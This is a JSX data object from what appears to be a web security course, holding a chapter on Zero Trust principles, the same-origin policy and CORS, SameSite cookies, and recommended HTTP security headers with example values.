    title: 'Advanced Security Topics',
    icon: <Cpu size={16} />,
    description: 'Zero Trust Architecture, supply chain security, browser security internals, and protocol-level defenses.',
    sections: [
      {
        subtitle: '8.1 Zero Trust Architecture',
        content: `Traditional security assumed a "castle and moat" model: everything inside the firewall is trusted, everything outside is not. Zero Trust inverts this: trust nothing, verify everything, always.

THE FIVE PILLARS OF ZERO TRUST

1. VERIFY EXPLICITLY
Authenticate and authorize every request based on all available data points:
- User identity (MFA-verified)
- Device health (MDM status, patch level, certificate)
- Network location (is this a known corporate network or a random VPN exit node?)
- Application being accessed (service-to-service uses mTLS + service accounts)
- Data sensitivity classification (more sensitive data requires higher assurance)

2. USE LEAST PRIVILEGE ACCESS
Never grant standing access. Use Just-In-Time (JIT) privileged access:
- Developer needs prod database read access? Approved, granted for 2 hours, automatically revoked
- No one has permanent admin access — they request it when needed and it's time-bound

3. ASSUME BREACH
Design for the scenario where your perimeter controls have already failed:
- End-to-end encryption for all data in transit (even within your private network)
- Micro-segmentation: even if an attacker is "inside," they can't reach other segments
- Continuous behavioral monitoring: detect anomalies even from authenticated users
- Blast radius minimization: limit what any single compromised account can reach

4. VERIFY DEVICE HEALTH
A valid user credential from a compromised device is not a valid login.
Zero Trust requires device attestation:
- Mobile Device Management (MDM): Jamf, Intune, Kandji
- Endpoint Detection and Response (EDR): CrowdStrike, SentinelOne
- Certificate-based device authentication

5. EXPLICIT NETWORK SEGMENTATION (Microsegmentation)
Replace broad network zones with fine-grained policies:
Service A can talk to Service B on port 5432 (database).
Service A cannot talk to Service C at all.
Implemented with: service mesh (Istio, Linkerd), network policies in Kubernetes, AWS Security Groups at the ENI level.

ZERO TRUST DOES NOT MEAN "NO TRUST"
It means trust is:
- Dynamic (reassessed continuously, not just at login)
- Contextual (same user gets different access in different contexts)
- Minimal (only what's needed for the current task)
- Verified (not assumed based on network location)`
      },
      {
        subtitle: '8.2 Browser Security Internals — Same-Origin Policy & CORS',
        content: `Understanding how browsers enforce security is fundamental to building secure web applications.

THE SAME-ORIGIN POLICY (SOP)
The most fundamental security mechanism in browsers. It prevents JavaScript from one origin from reading data from a different origin.

Origin = Protocol + Hostname + Port
https://app.example.com:443 is one origin.
http://app.example.com:443 (different protocol) = different origin
https://api.example.com:443 (different sub-domain) = different origin
https://app.example.com:8080 (different port) = different origin

What SOP prevents:
A malicious page at https://evil.com cannot use JavaScript to read the HTML response from https://yourbank.com/account even if you're logged in to your bank in another tab.

What SOP DOESN'T prevent (common misconception):
SOP doesn't prevent the BROWSER from making requests to other origins — only the JavaScript from reading the RESPONSE. This is why CSRF attacks work even with SOP.

CROSS-ORIGIN RESOURCE SHARING (CORS)
CORS is a mechanism that allows servers to explicitly opt-in to cross-origin access, controlled by HTTP response headers.

The CORS handshake:
1. Browser sends preflight OPTIONS request with proposed headers
2. Server responds with which origins, methods, and headers it allows
3. If the request matches the server's policy, the actual request proceeds
4. Browser allows JavaScript to read the response only if the origin is permitted

Critical headers:
Access-Control-Allow-Origin: https://yourapp.com   (specific, not *)
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true              (only if cookies needed)
Access-Control-Max-Age: 86400                       (cache preflight for 24h)

WHAT NEVER TO DO:
Access-Control-Allow-Origin: *
Unless your API is truly a public data API intended for any website to consume, wildcard CORS is a security misconfiguration.

COOKIES AND SAMESITE
SameSite=Strict: Cookie only sent for same-site requests. Best CSRF protection.
SameSite=Lax: Cookie sent for same-site requests + top-level navigations (clicking a link). CSRF-safe for most uses.
SameSite=None: Cookie sent for cross-site requests. Requires Secure attribute. Only use for deliberate cross-site cookie sharing (embedded widgets, OAuth flows).`
      },
      {
        subtitle: '8.3 HTTP Security Headers — Complete Reference',
        content: `Security headers are the fastest security wins available — usually a one-line configuration change with significant security impact.

CONTENT SECURITY POLICY (CSP)
The most powerful security header. Defines approved content sources to prevent XSS, data injection, and clickjacking.

Directives:
default-src: Fallback for unspecified directives
script-src: Controls JS execution — 'self', nonces, hashes (no 'unsafe-inline')
style-src: Controls CSS — 'self', 'unsafe-inline' acceptable if no inline scripts
img-src: Image sources — 'self' data: https: is common
connect-src: fetch(), WebSockets, EventSource targets
font-src: Web font sources (add fonts.gstatic.com if using Google Fonts)
frame-src: Allowed iframe sources ('none' for no iframes)
frame-ancestors: Who can embed this page ('none' = no clickjacking)
object-src: Flash, Java plugins ('none' always)
base-uri: Controls base tag ('self' prevents base tag injection)
form-action: Where forms can submit ('self' to prevent form hijacking)
upgrade-insecure-requests: Upgrades HTTP to HTTPS automatically

CSP Report URI (monitor CSP violations without blocking):
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violation-report

STRICT-TRANSPORT-SECURITY (HSTS)
Instructs browsers to always use HTTPS for your domain.
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

preload: Submit to HSTS Preload List at hstspreload.org — browser includes your domain in its built-in HTTPS-only list, before even the first request.

X-FRAME-OPTIONS
Prevents your site from being embedded in iframes (clickjacking protection).
X-Frame-Options: DENY (no one can iframe your site)
X-Frame-Options: SAMEORIGIN (only your own site can iframe it)
Superseded by CSP frame-ancestors, but keep both for older browser compatibility.

X-CONTENT-TYPE-OPTIONS
Prevents MIME type sniffing. Without this, browsers may execute JavaScript disguised as an image.
X-Content-Type-Options: nosniff

PERMISSIONS-POLICY (formerly Feature-Policy)
Restrict browser feature access. Extremely useful for limiting attack surface.
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()
This prevents any JavaScript on the page from accessing these APIs, even if XSS occurs.

REFERRER-POLICY
Controls what URL is sent in the Referer header when navigating to external sites.
Referrer-Policy: strict-origin-when-cross-origin
Sends origin only to cross-origin destinations, full URL for same-origin. Prevents leaking sensitive URL parameters to external sites.

CROSS-ORIGIN-OPENER-POLICY (COOP)
Prevents cross-origin windows from having access to your window object.
Cross-Origin-Opener-Policy: same-origin

CROSS-ORIGIN-EMBEDDER-POLICY (COEP)
Required to enable SharedArrayBuffer and high-resolution timers (needed for some security features to prevent Spectre attacks).
Cross-Origin-Embedder-Policy: require-corp

Grading your headers: https://securityheaders.com
Target: A+ score before production launch.`
      }
    ]
  }
];
